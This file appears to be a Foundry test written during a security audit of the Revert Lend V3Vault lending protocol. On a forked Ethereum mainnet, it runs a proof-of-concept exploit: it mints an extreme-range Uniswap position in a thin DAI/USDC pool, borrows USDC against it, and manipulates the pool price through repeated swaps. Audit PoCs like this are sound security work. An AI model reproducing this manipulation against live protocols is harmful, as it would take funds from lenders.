// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

// base contracts
import "../../src/V3Oracle.sol";
import "../../src/V3Vault.sol";
import "../../src/InterestRateModel.sol";
import {NonfungiblePositionManager} from "v3-periphery/NonfungiblePositionManager.sol";
import {ISwapRouter} from "v3-periphery/interfaces/ISwapRouter.sol";
// transformers
import "../../src/transformers/LeverageTransformer.sol";
import "../../src/transformers/V3Utils.sol";
import "../../src/transformers/AutoRange.sol";
import "../../src/transformers/AutoCompound.sol";

import "../../src/utils/FlashloanLiquidator.sol";

import "../../src/interfaces/IErrors.sol";

contract V3DebugTest is Test {
    uint256 constant Q32 = 2 ** 32;
    uint256 constant Q96 = 2 ** 96;

    uint256 constant YEAR_SECS = 31557600; // taking into account leap years

    address constant WHALE_ACCOUNT = 0xF977814e90dA44bFA03b6295A0616a897441aceC;

    IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);

    NonfungiblePositionManager constant NPM =
        NonfungiblePositionManager(payable(0xC36442b4a4522E871399CD717aBDD847Ab11FE88));
    address EX0x = 0xDef1C0ded9bec7F1a1670819833240f027b25EfF; // 0x exchange proxy
    address UNIVERSAL_ROUTER = 0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B;
    address PERMIT2 = 0x000000000022D473030F116dDEE9F6B43aC78BA3;
    address UNISWAP_SWAP_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;

    address constant CHAINLINK_USDC_USD = 0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6;
    address constant CHAINLINK_DAI_USD = 0xAed0c38402a5d19df6E4c03F4E2DceD6e29c1ee9;
    address constant CHAINLINK_ETH_USD = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;

    address constant UNISWAP_DAI_USDC = 0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168; // 0.01% pool
    address constant UNISWAP_ETH_USDC = 0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640; // 0.05% pool
    address constant UNISWAP_DAI_USDC_005 = 0x6c6Bc977E13Df9b0de53b251522280BB72383700; // 0.05% pool

    //@audit test on this low liquidity pool
    address constant UNISWAP_DAI_USDC_1000 = 0x6958686b6348c3D6d5f2dCA3106A5C09C156873a; //1% pool

    address constant TEST_NFT_ACCOUNT = 0x3b8ccaa89FcD432f1334D35b10fF8547001Ce3e5;
    uint256 constant TEST_NFT = 126; // DAI/USDC 0.05% - in range (-276330/-276320)

    address constant TEST_NFT_ACCOUNT_2 = 0x454CE089a879F7A0d0416eddC770a47A1F47Be99;
    uint256 constant TEST_NFT_2 = 1047; // DAI/USDC 0.05% - in range (-276330/-276320)

    uint256 constant TEST_NFT_UNI = 1; // WETH/UNI 0.3%

    uint256 mainnetFork;

    V3Vault vault;

    InterestRateModel interestRateModel;
    V3Oracle oracle;

    function setUp() external {
        mainnetFork = vm.createFork("https://rpc.ankr.com/eth", 18521658);
        vm.selectFork(mainnetFork);

        // 0% base rate - 5% multiplier - after 80% - 109% jump multiplier (like in compound v2 deployed)  (-> max rate 25.8% per year)
        interestRateModel = new InterestRateModel(0, Q96 * 5 / 100, Q96 * 109 / 100, Q96 * 80 / 100);

        // use tolerant oracles (so timewarp for until 30 days works in tests - also allow divergence from price for mocked price results)
        oracle = new V3Oracle(NPM, address(USDC), address(0));
        oracle.setTokenConfig(
            address(USDC),
            AggregatorV3Interface(CHAINLINK_USDC_USD),
            3600 * 24 * 30,
            IUniswapV3Pool(address(0)),
            0,
            V3Oracle.Mode.TWAP,
            0
        );
        oracle.setTokenConfig(
            address(DAI),
            AggregatorV3Interface(CHAINLINK_DAI_USD),
            3600 * 24 * 30,
            IUniswapV3Pool(UNISWAP_DAI_USDC),
            60,
            V3Oracle.Mode.CHAINLINK_TWAP_VERIFY,
            50000
        );
        oracle.setTokenConfig(
            address(WETH),
            AggregatorV3Interface(CHAINLINK_ETH_USD),
            3600 * 24 * 30,
            IUniswapV3Pool(UNISWAP_ETH_USDC),
            60,
            V3Oracle.Mode.CHAINLINK_TWAP_VERIFY,
            50000
        );

        vault =
            new V3Vault("Revert Lend USDC", "rlUSDC", address(USDC), NPM, interestRateModel, oracle, IPermit2(PERMIT2));
        vault.setTokenConfig(address(USDC), uint32(Q32 * 9 / 10), type(uint32).max); // 90% collateral factor / max 100% collateral value
        vault.setTokenConfig(address(DAI), uint32(Q32 * 9 / 10), type(uint32).max); // 90% collateral factor / max 100% collateral value
        vault.setTokenConfig(address(WETH), uint32(Q32 * 9 / 10), type(uint32).max); // 90% collateral factor / max 100% collateral value

        // limits 15 USDC each
        vault.setLimits(0, 15000000, 15000000, 12000000, 12000000);

        // without reserve for now
        vault.setReserveFactor(0);
    }

    function testDebug() public {
        USDC.approve(address(NPM), type(uint256).max);
        DAI.approve(address(NPM), type(uint256).max);
        USDC.approve(UNISWAP_SWAP_ROUTER, type(uint256).max);
        DAI.approve(UNISWAP_SWAP_ROUTER, type(uint256).max);

        //print vault balance
        vault.setLimits(0, 100_000e6, 100_000e6, 100_000e6, 100_000e6);
        // lend 100_000 USDC
        _deposit(100_000e6, WHALE_ACCOUNT);
        console.log("vault balance: %e", vault.totalAssets());



        console.log("-----first swap pool-----");
        // start exploit with 20000 token each
        deal(address(DAI), address(this), 20_000e18);
        deal(address(USDC), address(this), 100e6);

        ISwapRouter(UNISWAP_SWAP_ROUTER).exactInputSingle(
            ISwapRouter.ExactInputSingleParams({
                tokenIn: address(DAI),
                tokenOut: address(USDC),
                fee: 10000,
                recipient: address(this),
                deadline: block.timestamp + 100,
                amountIn: 100e18,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );
        printDAIPoolPrice();
        console.log("-----minting NFT-----");
        // mint extreme range
        // create liquidity on the far left side from uniswapv3
        int24 tickLower = 400000;
        int24 tickUpper = 500000;
        (uint256 tokenId,,,) = NPM.mint(
            INonfungiblePositionManager.MintParams({
                token0: address(DAI),
                token1: address(USDC),
                fee: 10000,
                tickLower: tickLower,
                tickUpper: tickUpper,
                amount0Desired: 19_000e18, //DAI
                amount1Desired: 0, //USDC
                amount0Min: 0,
                amount1Min: 0,
                recipient: address(this),
                deadline: block.timestamp + 100
            })
        );

        console.log("tokenId: %s", tokenId);
        // printNFTValue(tokenId);

        // we loan NFT
        console.log("-----borrow NFT-----");
        NPM.approve(address(vault), tokenId);
        vault.create(tokenId, address(this));
        console.log("USDC Exploiter BalanceBeforeBorrow: %e", USDC.balanceOf(address(this)));
        console.log("USDC Vault Balance BeforeBorrow: %e", vault.totalAssets());
        // (,, uint256 collateralValue,,) = vault.loanInfo(tokenId);
        // console.log("max USDC borrow: %e", collateralValue); //17_900 USDC for 20_000 DAI NFT
        vault.borrow(tokenId, 17_000e6);
        console.log("USDC Vault Balance AfterBorrow: %e", vault.totalAssets());
        console.log("USDC Exploiter BalanceAfterBorrow: %e", USDC.balanceOf(address(this)));
        console.log("DAI  Exploiter BalanceAfterBorrow: %e", DAI.balanceOf(address(this)));
        console.log("-----swap ----");
        // swap then check pool price

        printDAIPoolPrice();
        // swap my DAI to USDC
        for (uint256 i = 0; i < 15; i++) {
            vm.roll(block.number + 1);
            vm.warp(block.timestamp + 12);
            ISwapRouter(UNISWAP_SWAP_ROUTER).exactInputSingle(
                ISwapRouter.ExactInputSingleParams({
                    tokenIn: address(USDC),
                    tokenOut: address(DAI),
                    fee: 10000,
                    recipient: address(this),
                    deadline: block.timestamp + 100,
                    amountIn: 1000e6,
                    amountOutMinimum: 0,
                    sqrtPriceLimitX96: 0
                })
            );
            console.log("swap %s", i);
            printDAIPoolPrice();
        }

        console.log("----Exploiter Balance----");
        console.log("DAI balance: %e", DAI.balanceOf(address(this)));
        console.log("USDC balance: %e", USDC.balanceOf(address(this)));
        console.log("DAI balance: %s DAI", DAI.balanceOf(address(this)) / 1e18);
        console.log("USDC balance: %s USDC", USDC.balanceOf(address(this)) / 1e6);
    }

    function printDAIPoolPrice() internal {
        (uint160 sqrtPriceX96, int24 tick,,,,,) = IUniswapV3Pool(UNISWAP_DAI_USDC_1000).slot0();
        emit log_named_int("current tick: ", int256(tick));
        console.log("sqrtPriceX96 DAI/USDC: %e", sqrtPriceX96);
        console.log("price DAI/USDC: %e", FullMath.mulDiv(uint256(sqrtPriceX96) * sqrtPriceX96, 1e10, Q96));
    }

    function printNFTValue(uint256 tokenId) internal {
        console.log("-----NFT %s Value in DAI-----", tokenId);
        (uint256 value, uint256 feeValue, uint256 price0X96, uint256 price1X96) = oracle.getValue(tokenId, address(DAI));
        console.log("total value: %e", value + feeValue);
        (
            address token0,
            address token1,
            uint24 fee,
            uint128 liquidity,
            uint256 amount0,
            uint256 amount1,
            uint128 fees0,
            uint128 fees1
        ) = oracle.getPositionBreakdown(tokenId);
        console.log("DAI amount: %e", amount0);
        console.log("USDC amount: %e", amount1);
        console.log("DAI fee: %e", fees0);
        console.log("USDC fee: %e", fees1);
    }

    function _setupBasicLoan(bool borrowMax) internal {
        // lend 10 USDC
        _deposit(10000000, WHALE_ACCOUNT);

        // add collateral
        vm.prank(TEST_NFT_ACCOUNT);
        NPM.approve(address(vault), TEST_NFT);
        vm.prank(TEST_NFT_ACCOUNT);
        vault.create(TEST_NFT, TEST_NFT_ACCOUNT);

        (, uint256 fullValue, uint256 collateralValue,,) = vault.loanInfo(TEST_NFT);
        assertEq(collateralValue, 8847206);
        assertEq(fullValue, 9830229);

        if (borrowMax) {
            // borrow max
            vm.prank(TEST_NFT_ACCOUNT);
            vault.borrow(TEST_NFT, collateralValue);
        }
    }

    function _repay(uint256 amount, address account, uint256 tokenId, bool complete) internal {
        vm.prank(account);
        USDC.approve(address(vault), amount);
        if (complete) {
            (uint256 debtShares) = vault.loans(tokenId);
            vm.prank(account);
            vault.repay(tokenId, debtShares, true);
        } else {
            vm.prank(account);
            vault.repay(tokenId, amount, false);
        }
    }

    function _deposit(uint256 amount, address account) internal {
        vm.prank(account);
        USDC.approve(address(vault), amount);
        vm.prank(account);
        uint256 depositAmount = vault.deposit(amount, account);
        console.log("deposit %e USDC get %e share", amount, depositAmount);
    }

    function _createAndBorrow(uint256 tokenId, address account, uint256 amount) internal {
        vm.prank(account);
        NPM.approve(address(vault), tokenId);

        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeWithSelector(V3Vault.create.selector, tokenId, account);
        calls[1] = abi.encodeWithSelector(V3Vault.borrow.selector, tokenId, amount);

        vm.prank(account);
        vault.multicall(calls);
    }
}
